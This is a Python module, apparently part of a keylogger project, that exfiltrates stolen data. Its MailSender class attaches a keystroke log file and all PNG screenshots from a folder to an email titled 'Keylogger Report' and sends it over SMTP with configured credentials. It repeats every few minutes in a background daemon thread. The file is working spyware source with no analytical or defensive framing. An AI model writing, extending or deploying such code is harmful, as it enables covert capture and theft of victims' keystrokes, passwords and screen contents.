
import os
import smtplib
import json
import threading
import time
from email.message import EmailMessage
from utils.crypto import load_key

# Load config
with open("config.json", "r") as f:
    config = json.load(f)
email_conf = config.get("email", {})
SEND_INTERVAL = email_conf.get("send_interval", 300)

class MailSender:
    def __init__(self, log_file="logs/keystrokes.log", folder="screenshots"):
        self.log_file = log_file
        self.folder = folder
        self.key = load_key()

    def send_email(self):
        if not email_conf.get("enabled"):
            return

        msg = EmailMessage()
        msg["Subject"] = "Keylogger Report"
        msg["From"] = email_conf["sender"]
        msg["To"] = email_conf["receiver"]
        msg.set_content("Attached are the latest logs and screenshots.")

        # Attach log file
        if os.path.exists(self.log_file):
            with open(self.log_file, "rb") as f:
                msg.add_attachment(f.read(), maintype="application", subtype="octet-stream", filename="keystrokes.log")

        # Attach screenshots
        if os.path.exists(self.folder):
            for fname in os.listdir(self.folder):
                if fname.endswith(".png"):
                    path = os.path.join(self.folder, fname)
                    with open(path, "rb") as f:
                        msg.add_attachment(f.read(), maintype="image", subtype="png", filename=fname)

        try:
            with smtplib.SMTP(email_conf["smtp_server"], email_conf["smtp_port"]) as server:
                server.starttls()
                server.login(email_conf["sender"], email_conf["password"])
                server.send_message(msg)
                print("[📧] Email sent successfully.")
        except Exception as e:
            print(f"[❌] Failed to send email: {e}")

    def start_loop(self):
        while True:
            self.send_email()
            time.sleep(SEND_INTERVAL)

    def start_in_thread(self):
        t = threading.Thread(target=self.start_loop)
        t.daemon = True
        t.start()
        print("[📨] Email sending thread started.")
